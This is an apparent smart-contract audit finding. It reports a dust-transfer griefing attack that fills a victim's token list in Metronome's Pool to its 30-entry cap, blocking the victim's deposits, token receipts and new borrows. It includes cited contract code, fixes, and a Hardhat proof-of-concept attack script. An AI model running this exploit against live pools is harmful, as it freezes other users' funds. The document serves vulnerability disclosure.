### Title
Dust-transfer griefing fills a victim's per-account token list to `MAX_TOKENS_PER_USER`, DoSing their deposits, receives, and new borrows - ([File: contracts/Pool.sol])

### Summary
CVE-2020-10761 is a boundary-condition bug: a spec-compliant request at the edge of the maximum permitted length trips an assertion and crashes the server (DoS). The Metronome analog is the `MAX_TOKENS_PER_USER = 30` boundary in `Pool.onlyIfAdditionWillNotReachMaxTokens` (`contracts/Pool.sol:143-148`). `DebtToken`s are non-transferable (`TransferNotSupported`), but `DepositToken`s are freely transferable, and any first-time credit to an account calls `pool.addToDepositTokensOfAccount`, which reverts once the account's combined deposit+debt token list reaches 30 entries. An unprivileged attacker can dust-transfer msdTOKEN balances of every deposit token the victim doesn't already hold, pushing the victim's list to the boundary so that every subsequent state-changing interaction that adds a new token entry — `deposit` into a new collateral, receiving a new msdTOKEN, `issue`/`mint` of a new debt token — reverts with `UserReachedMaxTokens`.

### Finding Description
- `Pool.addToDepositTokensOfAccount` and `Pool.addToDebtTokensOfAccount` are gated by `onlyIfAdditionWillNotReachMaxTokens`, which reverts when `debtTokensOfAccount.length + depositTokensOfAccount.length >= MAX_TOKENS_PER_USER` (30). [1](#0-0) [2](#0-1) 
- `DepositToken._transfer` calls `pool.addToDepositTokensOfAccount(recipient_)` whenever the recipient's balance goes from 0 to nonzero — permissionlessly, on any `transfer`/`transferFrom`/`seize`. [3](#0-2) 
- `DepositToken._mint` does the same on `deposit`/`flashWithdraw`-adjacent mints. [4](#0-3) 
- `DebtToken._mint` adds the account's first debt entry via `pool.addToDebtTokensOfAccount(account_)`, which enforces the same combined limit — so a filled list also blocks the victim from opening any *new* debt position (new synthetic issuance). [5](#0-4) 
- Attack path: attacker deposits dust collateral into every deposit token the victim does not hold (gaining a balance in each), then `transfer(victim, 1)` for each token until `depositTokensOfAccount[victim] + debtTokensOfAccount[victim] == 30`. The victim's own positions already count toward 30, reducing the attacker's cost. Thereafter the victim's `deposit` on any collateral they don't hold reverts in `_mint`, receiving msdTOKENs reverts in `_transfer`, and `DebtToken.issue`/`mint` for a new synth reverts in `_mint`. Withdrawing an entire dusted entry frees a slot (`_burn`/`_transfer` calls `removeFromDepositTokensOfAccount` at zero balance), so the freeze is temporary rather than permanent — matching the "temporary freezing of funds" acceptance criterion. [6](#0-5) 
- No modifier stops it: `transfer` only checks the *sender's* `unlockedBalanceOf`, not the recipient's list size until the boundary revert; pause/shutdown flags don't apply to `transfer`; SynthContext doesn't restrict plain ERC20 calls. [7](#0-6) 

### Impact Explanation
Temporary freezing of victim funds/operations at the boundary: the victim cannot deposit new collateral types, cannot receive any new deposit token, and cannot open debt in a new synthetic until they manually clear entries by withdrawing/transferring out full dust balances. This can also delay liquidations-adjacent actions (e.g., the victim topping up a new collateral to restore health reverts), and forced-seizure via `Pool.liquidate` → `DepositToken.seize` to a beneficiary at the boundary similarly reverts. Direct invariant broken: liveness of per-account token registration at the documented 30-entry maximum.

### Likelihood Explanation
Medium. Requires no privileged roles and only ordinary `deposit` + `transfer` calls. Cost is bounded: attacker needs a dust balance in each deposit token used for stuffing (limited by how many deposit tokens the pool registers; Metronome pools register several msd assets, and the victim's existing deposit/debt entries reduce the number needed to reach 30). Recovery is possible but costs the victim transactions per entry and is unknown to most users, and the attacker can re-fill freed slots cheaply.

### Recommendation
- Charge the max-tokens check only to the *sender's* own accounting, or exempt unsolicited dust: e.g., add an opt-in `allowDepositsFrom`-style registry, or let `addToDepositTokensOfAccount` fail-open for transfers while still enforcing on `deposit`/`issue` initiated by the account.
- Alternatively, cap at the account level only for entries the account opted into, or lazily evict zero-balance entries (a 1-wei dust balance still occupies a slot; consider removing entries below a threshold).
- At minimum, allow `transfer`/`seize` to skip registration when the recipient is at the cap instead of reverting the whole transfer (track unregistered balances separately and reconcile in `debtPositionOf`).

### Proof of Concept
Hardhat fork sketch:

```ts
// pool: deployed Pool with depositTokens [msdA, msdB, ..., msdN]
// victim already holds some msd/debt tokens; suppose count = k.

// 1) Attacker acquires dust in every deposit token victim lacks.
for (const dt of depositTokens) {
  if (!(await dt.balanceOf(attacker)).gt(0)) {
    await underlying(dt).approve(dt.address, dust);
    await dt.connect(attacker).deposit(dust, attacker.address); // mints msd dust
  }
}

// 2) Stuff the victim's list to MAX_TOKENS_PER_USER (30).
for (const dt of depositTokens) {
  if ((await dt.balanceOf(victim.address)).eq(0)) {
    const len = (await pool.getDepositTokensOfAccount(victim.address)).length
              + (await pool.getDebtTokensOfAccount(victim.address)).length;
    if (len >= 30) break;
    await dt.connect(attacker).transfer(victim.address, 1); // adds entry
  }
}
expect(await pool.getDepositTokensOfAccount(victim.address))
  .length.plus((await pool.getDebtTokensOfAccount(victim.address)).length).to.eq(30);

// 3) Victim is DoSed:
await expect(
  msdNew.connect(victim).deposit(amount, victim.address)
).revertedWithCustomError(pool, 'UserReachedMaxTokens');          // _mint -> addToDepositTokensOfAccount

await expect(
  msXDebtToken.connect(victim).issue(issueAmt, victim.address)
).revertedWithCustomError(pool, 'UserReachedMaxTokens');          // _mint -> addToDebtTokensOfAccount

await expect(
  msdNew.connect(attacker).transfer(victim.address, 1)
).revertedWithCustomError(pool, 'UserReachedMaxTokens');          // _transfer -> addToDepositTokensOfAccount

// 4) Recovery requires victim to fully empty a dusted slot (burn/transfer-all).
```

### Citations

**File:** contracts/Pool.sol (L143-148)
```text
    modifier onlyIfAdditionWillNotReachMaxTokens(address account_) {
        if (debtTokensOfAccount.length(account_) + depositTokensOfAccount.length(account_) >= MAX_TOKENS_PER_USER) {
            revert UserReachedMaxTokens();
        }
        _;
    }
```

**File:** contracts/Pool.sol (L204-220)
```text
    function addToDebtTokensOfAccount(address account_) external onlyIfAdditionWillNotReachMaxTokens(account_) {
        address _debtToken = _msgSender();
        _revertIfSenderIsNotDebtToken(_debtToken);
        if (!debtTokensOfAccount.add(account_, _debtToken)) revert DebtTokenAlreadyExists();
    }

    /**
     * @notice Add a deposit token to the per-account list
     * @dev This function is called from `DepositToken` when user's balance changes from `0`
     * @dev The caller should ensure to not pass `address(0)` as `_account`
     * @param account_ The account address
     */
    function addToDepositTokensOfAccount(address account_) external onlyIfAdditionWillNotReachMaxTokens(account_) {
        address _depositToken = _msgSender();
        _revertIfSenderIsNotDepositToken(_depositToken);
        if (!depositTokensOfAccount.add(account_, _depositToken)) revert DepositTokenAlreadyExists();
    }
```

**File:** contracts/DepositToken.sol (L347-354)
```text
    /// @inheritdoc IERC20
    function transfer(address to_, uint256 amount_) external override returns (bool) {
        address _msgSender = _msgSender();
        _revertIfLocked(_msgSender, amount_);

        _transfer(_msgSender, to_, amount_);
        return true;
    }
```

**File:** contracts/DepositToken.sol (L459-462)
```text
        // Remove this token from the deposit tokens list if the sender's balance goes to zero
        if (_amount > 0 && _balanceAfter == 0) {
            pool.removeFromDepositTokensOfAccount(_account);
        }
```

**File:** contracts/DepositToken.sol (L485-488)
```text
        // Add this token to the deposit tokens list if the recipient is receiving it for the 1st time
        if (_balanceBefore == 0 && amount_ > 0) {
            pool.addToDepositTokensOfAccount(account_);
        }
```

**File:** contracts/DepositToken.sol (L517-525)
```text
        // Add this token to the deposit tokens list if the recipient is receiving it for the 1st time
        if (_recipientBalanceBefore == 0 && amount_ > 0) {
            pool.addToDepositTokensOfAccount(recipient_);
        }

        // Remove this token from the deposit tokens list if the sender's balance goes to zero
        if (amount_ > 0 && balanceOf[sender_] == 0) {
            pool.removeFromDepositTokensOfAccount(sender_);
        }
```

**File:** contracts/DebtToken.sol (L597-600)
```text
        //  Add this token to the debt tokens list if the recipient is receiving it for the 1st time
        if (_balanceBefore == 0 && amount_ > 0) {
            pool.addToDebtTokensOfAccount(account_);
        }
```
